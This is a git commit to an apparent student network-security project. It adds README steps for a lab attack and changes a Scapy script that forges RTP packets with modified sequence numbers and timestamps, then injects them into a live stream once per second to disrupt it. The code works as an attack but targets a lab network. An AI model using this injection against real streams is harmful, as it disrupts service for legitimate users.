e76d883cacb80e54ee9f8352e5fed6aa84fe3775
Henry Dinh <henryldinh@live.com>
2017-03-29 13:45:49 -0500

    Update readme.

--- README.md
+++ README.md
@@ -1,2 +1,19 @@
 # Network-Security-Project
 Capture RTP packets from a live stream, create a dummy RTP packet with garbage data, inject packet timely back into RTP stream to disrupt the service.
+
+## Steps to execute program
+
+### 1. Clear all previous controllers and clean the network:
+```
+bash networkClean
+```
+
+### 2. Start the network:
+ ```
+ bash networkStart
+ ```
+ 
+ ### 3. Start VLC player on host 1 (h1) and host 2 (h2). Host 3 (h3) is the attacker:
+ ```
+ vlc-wrapper &
+ ```
--- injector.py
+++ injector.py
@@ -1,6 +1,7 @@
 # takes a packet as input, modifies its payload/header, and resends it
 
 from scapy.all import *
+import time
 
 # takes in a packet from the main thread and modifies its seq num and timestamp
 def modifyPacketHeader(packet, new_seq, new_ts):
@@ -18,12 +19,13 @@ def sendPacket(packet):
 if __name__ == '__main__':
 	# create a dummy packet
 	rtp = RTP(payload_type=26, sequence=5, timestamp=17)
-	ip = IP(src="192.168.1.101", dst="90.0.0.2")
+	ip = IP(src="192.168.1.101", dst="10.0.0.2")
 	udp = UDP(sport=1001, dport=1002)
 	raw = "hello, this is raw data."
 	test_packet = ip/udp/rtp/raw
 	
 	print "Original packet:"
+	print test_packet.summary()
 	print test_packet.show()
 	print "\n\n\n"
 	
@@ -31,9 +33,12 @@ if __name__ == '__main__':
 	modifyPacketHeader(test_packet, 8, 21)
 	
 	print "Packet with modified header:"
+	print test_packet.summary()
 	print test_packet.show()
 	print "\n\n\n"
 	
 	print test_packet.getlayer(RTP).load
 	
-	sendPacket(test_packet)
+	while 1:
+		time.sleep(1)
+		sendPacket(test_packet)
